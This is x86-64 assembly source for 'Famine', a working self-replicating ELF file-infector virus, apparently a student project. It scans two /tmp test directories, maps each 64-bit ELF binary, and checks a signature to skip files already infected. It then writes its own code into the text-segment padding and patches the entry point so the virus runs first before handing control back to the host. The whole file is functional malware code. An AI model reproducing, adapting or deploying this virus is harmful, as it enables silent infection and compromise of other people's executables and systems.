
; 791 bytes

%include "famine.inc"

bits 64
section .text
default rel
global _start

_start:
	push rdi
	push rsi
	push rcx
	push rdx

	; === Placing our 'famine' struct on the stack ===
	push rbp
	mov rbp, rsp
	sub rsp, famine_size

	lea rdi, [rel target_1]
	call _traverse_dir
	lea rdi, [rel target_2]
	call _traverse_dir

	add rsp, famine_size
	lea r15, [rel _start]
	mov rsi, [rel virus_entry]
	sub r15, rsi
	add r15, [rel host_entry]

	pop rbp
	pop rdx
	pop rcx
	pop rsi
	pop rdi
	jmp r15


; ##### LOOP THROUGH TARGET DIRECTORIES #####

_traverse_dir:
	; === ===
	mov r12, rdi					; Saving name of directory in r12
	mov rax, SYS_OPEN
	mov rsi, O_RDONLY
	xor rdx, rdx
	syscall
	cmp rax, 0
	jl _return

	; === getdents(dir_fd, struc linux_dirent *dirp, count) ===
	mov rdi, rax												; rax has the fd of the "open" call on directory
	lea rsi, FAM(famine.dirents)
	xor r8, r8
	mov FAM(famine.total_dreclen), r8							; Initializing total_dreclen to 0
	mov rdx, DIRENTS_BUFF_SIZE
	mov rax, SYS_GETENTS
	syscall
	cmp rax, 0
	jl _return
	mov r15, rax

	; === Beginning of the loop iterating through files of directory ===
	_list_dir:
		xor r14, r14											; r14 will store d_reclen
		lea rsi, FAM(famine.dirents)							; rsi used to navigate current dirent, and ultimatly store d_name
		add rsi, FAM(famine.total_dreclen)						; bring rsi to our current dirent (start of dirent array + total d_reclen browsed until now)
		mov r13, rsi											; r13 will store d_type of current dirent
		add rsi, D_RECLEN_OFF									; bring rsi to the offset at which d_reclen is located
		mov r14w, word [rsi]									; mov d_reclen (pointed by rsi) to r14
		add rsi, D_NAME_OFF - D_RECLEN_OFF						; bring rsi to the offset of d_name
		add FAM(famine.total_dreclen), r14						; keep track of the total d_reclen
		sub r14, 1
		add r13, r14											; we're adding d_reclen - 1 to r13 in order to bring it to the d_type offset
		movzx r13, byte [r13]									; r13 has d_type value

		cmp r13, 0x8											; r13 has d_type. If type is 0x8 (regular file), handle the file
		je _file
		check_dir_loop:
			cmp qword FAM(famine.total_dreclen), r15
			jge _return
			jmp _list_dir





; ##### FILE INFECTION #####

_file:
	; === open(filename, O_RDWR, 0) | (path must be in rdi) ===
	push rsi
	lea rdi, FAM(famine.current_fpath)
	mov rsi, r12
	mov rdx, rdi

	.dir:
		movsb
		cmp byte [rsi], 0
		jne .dir
		pop rsi
	.fname:
		movsb
		cmp byte [rsi - 1], 0
		jne .fname

	mov rdi, rdx
	mov rax, SYS_OPEN
	mov rsi, O_RDWR
	xor rdx, rdx
	syscall
	mov r8, rax													; r8 will have fd (for mmap)
	cmp rax, 0													; Error checking (open failed)
	jl check_dir_loop

	; === Calculate the size of the file with lseek ===
	mov rdi, rax
	xor rsi, rsi
	mov rdx, 2
	mov rax, SYS_LSEEK
	syscall
	cmp rax, 4													; Error checking (file too small)
	jl check_dir_loop

	; === mmap(0, filesize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0) ===
	xor rdi, rdi
	mov rsi, rax
	mov rdx, PROT_READ | PROT_WRITE
	mov r10, MAP_SHARED
	xor r9, r9
	mov rax, 9
	syscall
	mov FAM(famine.map_ptr), rax								; Saving mapped file pointer in famine.map_ptr
	cmp rax, 0													; Error checking (mmap failed)
	jl check_dir_loop

	; === Making sure the file is an ELF file ===
	cmp dword [rax], 0x464c457f									; Magic bytes characterising an ELF file
	jne check_dir_loop

	; === Making sure the ELF file is x64 ===
	cmp byte [rax + 0x4], 0x2
	jne check_dir_loop

	; === Getting the segments offset in file ===
	add rax, elf64_ehdr.e_phoff

	; === Finding the text segment in file ===
	mov r11, [rax]												; Storing e_phoff in r11
	mov rax, FAM(famine.map_ptr)
	mov r14, rax
	add r14, elf64_ehdr.e_phnum
	movzx r14, word [r14]										; Storing e_phnum in r14

	dec r14														; Decrementing by 1 since our counter starts at 0
	add rax, r11												; rax is now at the start of segment headers in file
	xor r13, r13												; Used to loop through all segment headers
	_phnum_loop:
		call _is_text_segment
		cmp r14, r13
		je _list_dir											; We iterated through all segment headers and didnt find the text segment. Give up for this file
		add rax, elf64_phdr_size
		inc r13
		jmp _phnum_loop
	_found_text_segment:
		add rax, elf64_phdr.p_offset
		mov rdi, [rax]
		mov FAM(famine.txt_offset), rdi

		add rax, elf64_phdr.p_vaddr - elf64_phdr.p_offset
		mov rdi, [rax]
		mov FAM(famine.txt_vaddr), rdi

		add rax, elf64_phdr.p_filesz - elf64_phdr.p_vaddr
		mov rdi, [rax]
		mov FAM(famine.txt_filesz), rdi

		add rax, elf64_phdr_size - (elf64_phdr.p_filesz - elf64_phdr.p_offset)
		mov rdi, [rax]
		mov FAM(famine.next_offset), rdi

	; === Is the file already infected ? ===
	mov rdi, FAM(famine.map_ptr)
	add rdi, FAM(famine.txt_offset)
	add rdi, FAM(famine.txt_filesz)
	add rdi, VIRUS_SIZE
	sub rdi, (_finish - signature)
	mov rax, [rel signature]
	cmp rax, qword [rdi]
	je check_dir_loop

	; === Calculating the space available in padding gap ===
	mov rsi, FAM(famine.next_offset)
	mov rdi, FAM(famine.txt_offset)
	add rdi, FAM(famine.txt_filesz)
	sub rsi, rdi
	mov FAM(famine.gap_size), rsi

	; === Comparing gap size and virus size ===
	mov rdi, VIRUS_SIZE
	cmp rdi, rsi
	jg check_dir_loop

	; === Patch ELF entry point ===
	mov rax, FAM(famine.map_ptr)
	add rax, elf64_ehdr.e_entry
	mov rsi, [rax]
	mov FAM(famine.orig_entry), rsi
	mov rdi, FAM(famine.txt_vaddr)
	add rdi, FAM(famine.txt_filesz)
	mov r13, rdi
	mov [rax], rdi
	
	; === Writing virus from injection point ===
	mov rdi, FAM(famine.map_ptr)
	add rdi, FAM(famine.txt_offset)
	add rdi, FAM(famine.txt_filesz)								; rdi at injection point
	lea rsi, [rel _start]										; rsi at start of virus
	mov rcx, VIRUS_SIZE											; Copy whole virus to injection point
	repnz movsb

	mov qword [rdi - 8], r13
	mov r14, FAM(famine.orig_entry)
	mov qword [rdi - 16], r14

	jmp check_dir_loop


_is_text_segment:
	mov rsi, rax												; rax has the address of p_type
	cmp dword [rsi], 0x1										; |
	jne _return													; |	--> If the segment type isn't PT_LOAD, this isn't the text segment  
	add rsi, elf64_phdr.p_flags
	mov rsi, [rsi]
	and rsi, 0x1												; |
	cmp rsi, 0x0												; | --> If the segment hasn't the flag PF_X (executable), this isn't the text segment
	je _return													; |
	pop rdi
	jmp _found_text_segment


_return:
	ret

_exit:
	mov rax, SYS_EXIT
	mov rdi, 0
	syscall

target_1	db		"/tmp/test/",0x0
target_2	db		"/tmp/test2/",0x0
signature	db		"Famine version 1.0 (c)oded by qroland",0x0
host_entry	dq		_exit
virus_entry	dq		_start
_finish:
